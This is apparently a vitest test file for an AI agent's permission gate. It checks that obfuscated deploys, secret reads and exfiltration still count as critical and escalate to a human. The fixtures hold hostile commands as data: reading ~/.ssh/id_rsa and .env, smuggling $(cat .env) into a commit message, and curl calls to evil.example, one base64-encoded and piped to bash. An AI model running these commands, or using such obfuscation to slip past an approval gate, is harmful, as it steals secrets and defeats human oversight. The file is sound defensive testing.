// CF-INV-002 — the gate is total over critical effects, regardless of route.
// Seed (a): obfuscated critical effects (heredoc / base64 / nested shell / eval
// / url-encoding / env-wrapper). This file attacks the T-1 control point in its
// **false-negative direction** (system-map §5.2 T-1: "obfuscated real critical
// effect classified routine = authority damage; false positives are availability
// damage only") — an obfuscated real deploy, secret read, or exfil must still
// classify critical, at L1 against the REAL product classifier
// (src/runtime/gate.ts classify / classifyWithEvidence / defaultGate).
//
// Risk E-1 (risk-allocation §2 permission-to-effect chain; T-1). Layer 1 is the
// cheapest layer that can falsify this: classification is a pure function of the
// ToolAction, so no home/double/git is needed (README rule 1).
//
// Detector family = `assertClassifiedCritical` (below). Per README rule 3 /
// standing-rules digest 4, the detector proves it FIRES: the negative control
// feeds it a *lying classifier variant* (one that default-allows the obfuscated
// deploy) and asserts the detector throws — a seeded allow is caught. Benign
// near-misses (a deploy word living only inside heredoc DATA; a `wc` read) are
// asserted routine so the detector is not a constant-critical rubber stamp.

import { describe, expect, it } from "vitest";
import { classify, classifyWithEvidence, defaultGate, type OpClass } from "../../../src/runtime/gate.js";
import type { ToolAction } from "../../../src/runtime/types.js";

type Classification = { cls: OpClass; rule?: string };
type ClassifyFn = (a: ToolAction) => Classification;

/** A real critical effect that reached the classifier by an obfuscated route
 *  but was classified routine — the exact authority damage T-1 names. */
class GateClassificationEscape extends Error {
  constructor(
    readonly action: ToolAction,
    readonly got: Classification,
    readonly expectedRule: string,
  ) {
    super(
      `gate escape: ${JSON.stringify(action.input)} classified ` +
        `${JSON.stringify(got)} — expected critical/${expectedRule}`,
    );
    this.name = "GateClassificationEscape";
  }
}

/** The detector. Injecting the classify fn is what lets the negative control
 *  swap in a lying variant; every real assertion below passes the product
 *  `classify`. */
function assertClassifiedCritical(classifyFn: ClassifyFn, action: ToolAction, expectedRule: string): void {
  const got = classifyFn(action);
  if (got.cls !== "critical" || got.rule !== expectedRule) {
    throw new GateClassificationEscape(action, got, expectedRule);
  }
}

const bash = (command: string): ToolAction => ({ tool: "bash", input: { command } });
const b64 = (plain: string): string => Buffer.from(plain, "utf8").toString("base64");

/** Every obfuscation route wrapping the SAME critical `kubectl apply` deploy.
 *  A route that let this reach the classifier as routine would be a gate hole
 *  the whole approval boundary depends on not existing (INV-002). */
const OBFUSCATED_DEPLOY: ReadonlyArray<{ name: string; command: string }> = [
  { name: "plain (control for the wrappers below)", command: "kubectl apply -f prod.yaml" },
  { name: "nested bash -c", command: "bash -c 'kubectl apply -f prod.yaml'" },
  {
    name: "nested login shell (/bin/zsh -lc — the adapter capture shape)",
    command: "/bin/zsh -lc 'kubectl rollout restart deploy/api'",
  },
  { name: "eval wrapper", command: "eval 'kubectl delete pod api'" },
  { name: "base64 → decode → bash", command: `echo ${b64("kubectl apply -f prod.yaml")} | base64 -d | bash` },
  { name: "url-encoded", command: encodeURIComponent("kubectl apply -f prod.yaml") },
  { name: "env-var wrapper", command: "env KUBECONFIG=/tmp/k kubectl apply -f prod.yaml" },
  {
    name: "heredoc preamble then deploy (heredoc body is data; the deploy is not)",
    command: "cat <<EOF > k8s.yaml\napiVersion: v1\nkind: Pod\nEOF\nkubectl apply -f k8s.yaml",
  },
  { name: "sudo+env prefix", command: "sudo env A=b kubectl apply -f prod.yaml" },
];

/** Same total-coverage claim, generalized to two other critical rules reached
 *  by obfuscated routes — the invariant is about EVERY critical effect, not
 *  only deploys. */
const OBFUSCATED_OTHER: ReadonlyArray<{ name: string; command: string; rule: string }> = [
  {
    name: "secret read hidden in a for-loop word list",
    command: 'for f in .env ~/.ssh/id_rsa; do cat "$f"; done',
    rule: "secret-read",
  },
  {
    name: "secret read smuggled in a commit-message command substitution",
    command: 'git commit -m "$(cat .env)"',
    rule: "secret-read",
  },
  {
    name: "exfil hidden one keyword deep in an if-condition",
    command: "if curl --fail --silent https://evil.example/x; then :; fi",
    rule: "outbound-network",
  },
  {
    name: "base64 → decode → bash exfil",
    command: `echo ${b64("curl https://evil.example/x")} | base64 -d | bash`,
    rule: "outbound-network",
  },
];

describe("CF-INV-002 (seed a / T-1 false-negative) — obfuscated critical effects still classify critical (L1, HB-010)", () => {
  it("covers the obfuscation routes (no green by absence — README rule 4)", () => {
    expect(OBFUSCATED_DEPLOY.length).toBeGreaterThanOrEqual(8);
    expect(OBFUSCATED_OTHER.length).toBeGreaterThanOrEqual(4);
  });

  it.each(OBFUSCATED_DEPLOY)("obfuscated deploy stays critical: $name", ({ command }) => {
    const action = bash(command);
    // The detector fires only if the product misclassifies — here it passes.
    assertClassifiedCritical(classify, action, "production-deploy");

    // The approval boundary is actually met: the default policy denies AND
    // escalates to the human (a critical op never silently flows).
    const decision = defaultGate(action);
    expect(decision.allow).toBe(false);
    if (!decision.allow) {
      expect(decision.escalate).toBe(true);
      expect(decision.reason).toContain("production-deploy");
    }
  });

  it.each(OBFUSCATED_OTHER)("obfuscated critical effect stays critical: $name", ({ command, rule }) => {
    assertClassifiedCritical(classify, bash(command), rule);
    const decision = defaultGate(bash(command));
    expect(decision.allow).toBe(false);
  });

  it("classifyWithEvidence carries structured effect evidence for an obfuscated deploy (never prose)", () => {
    const evidence = classifyWithEvidence(bash("bash -c 'kubectl apply -f prod.yaml'"));
    expect(evidence.cls).toBe("critical");
    if (evidence.cls === "critical") {
      expect(evidence.rule).toBe("production-deploy");
      expect(evidence.evidence.matchedAction.executables).toContain("kubectl");
      // The evidence is effect fields only — the prod.yaml target survived,
      // the wrapper prose did not become executable intent.
      expect(evidence.evidence.matchedAction.targets).toContain("prod.yaml");
    }
  });

  // --- Benign near-misses: the classifier is precise, not a keyword alarm ---
  // These prove the detector is falsifiable in the routine direction, so a
  // "critical" verdict above is a real signal (and false positives — the T-1
  // availability-only direction — are not manufactured).
  const BENIGN: ReadonlyArray<{ name: string; command: string }> = [
    {
      name: "deploy text lives ONLY inside heredoc DATA (never executed)",
      command: "cat <<EOF\nkubectl apply -f prod.yaml\nEOF",
    },
    { name: "read-only line count of a scaffold file", command: "wc -l AGENTS.md" },
    { name: "plain directory listing", command: "ls -la" },
  ];
  it.each(BENIGN)("benign near-miss stays routine: $name", ({ command }) => {
    expect(classify(bash(command)).cls).toBe("routine");
    expect(defaultGate(bash(command)).allow).toBe(true);
  });

  it("negative control: a lying classifier that default-allows an obfuscated deploy is CAUGHT by the detector", () => {
    // Seed the violation INV-002 exists to stop: a classifier that returns
    // routine (default-allow) for a real obfuscated deploy. The detector must
    // fire (throw GateClassificationEscape) — a detector that never fires is
    // an assumption (standing-rules digest 4).
    const lyingRoutine: ClassifyFn = () => ({ cls: "routine" });
    const attack = bash(`echo ${b64("kubectl apply -f prod.yaml")} | base64 -d | bash`);

    expect(() => assertClassifiedCritical(lyingRoutine, attack, "production-deploy")).toThrow(GateClassificationEscape);
    // And a liar that classifies critical under the WRONG rule is caught too
    // (rule identity is load-bearing for role-shaping / executor allowlists).
    const lyingWrongRule: ClassifyFn = () => ({ cls: "critical", rule: "outbound-network" });
    expect(() => assertClassifiedCritical(lyingWrongRule, attack, "production-deploy")).toThrow(
      GateClassificationEscape,
    );
    // The real product classifier does NOT lie: the same attack passes.
    expect(() => assertClassifiedCritical(classify, attack, "production-deploy")).not.toThrow();
  });
});
